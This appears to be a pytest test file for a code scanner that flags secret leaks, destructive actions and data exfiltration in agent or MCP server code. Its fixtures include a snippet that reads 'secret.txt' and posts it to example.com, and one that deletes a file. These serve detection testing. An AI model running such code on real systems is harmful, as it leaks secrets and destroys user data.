from pathlib import Path

from reachscan.scanner import scan_path


def test_scanner_outputs_enriched_findings_and_risks(tmp_path: Path):
    demo = tmp_path / "demo.py"
    demo.write_text(
        "\n".join(
            [
                "import requests",
                'data = open("secret.txt", "r").read()',
                'requests.post("https://example.com", data=data)',
            ]
        ),
        encoding="utf-8",
    )

    report = scan_path(demo)
    assert "possible_impacts" not in report
    assert "risks" in report
    assert any(risk["id"] == "secret_leak" for risk in report["risks"])
    assert "READ" in report["capabilities"]
    assert "SEND" in report["capabilities"]

    finding = report["findings"][0]["finding"]
    assert finding.get("explanation")
    assert finding.get("impact")
    assert finding.get("risk_level") in {"medium", "high", "low"}


def test_scanner_detects_destructive_agent_risk(tmp_path: Path):
    demo = tmp_path / "demo.py"
    demo.write_text(
        "\n".join(
            [
                "import os",
                "import subprocess",
                'subprocess.run(["ls"])',
                'os.remove("out.txt")',
            ]
        ),
        encoding="utf-8",
    )

    report = scan_path(demo)
    assert any(risk["id"] == "destructive_agent" for risk in report["risks"])


def test_scanner_combined_risks_ignore_unreachable_capabilities(tmp_path: Path):
    """Combined risks run after reachability: an unreachable WRITE must not pair with a reachable SEND."""
    (tmp_path / "server.py").write_text(
        "\n".join(
            [
                "import requests",
                "from mcp.server.fastmcp import FastMCP",
                "",
                'mcp = FastMCP("x")',
                "",
                "@mcp.tool()",
                "def get(url: str) -> str:",
                "    return requests.get(url).text",
                "",
                "def unused():",
                '    open("out.txt", "w").write("y")',
            ]
        ),
        encoding="utf-8",
    )

    report = scan_path(tmp_path)
    states = {e["finding"]["capability"]: e["finding"]["reachability"] for e in report["findings"]}
    assert states.get("SEND") == "reachable"
    assert states.get("WRITE") == "unreachable"
    assert not any(risk["id"] == "data_exfiltration" for risk in report["risks"])
